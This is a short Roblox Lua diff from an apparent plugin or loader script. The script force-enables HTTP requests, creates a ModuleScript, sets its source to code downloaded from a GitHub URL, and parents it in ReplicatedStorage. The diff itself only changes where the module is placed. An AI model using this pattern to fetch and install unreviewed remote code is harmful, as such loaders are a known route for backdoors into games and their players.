@@ -8,7 +8,7 @@ local httpEnabled = http.HttpEnabled;
 http.HttpEnabled = true;
 
 local m = Instance.new("ModuleScript");
-m.Parent = game:GetService("Selection"):Get()[1] or game:GetService("ReplicatedStorage");
+m.Parent = game:GetService("ReplicatedStorage");
 m.Name = "9_IN_1";
 m.Source = http:GetAsync("https://raw.githubusercontent.com/copykites/store/main/roblox/e.lua");
 
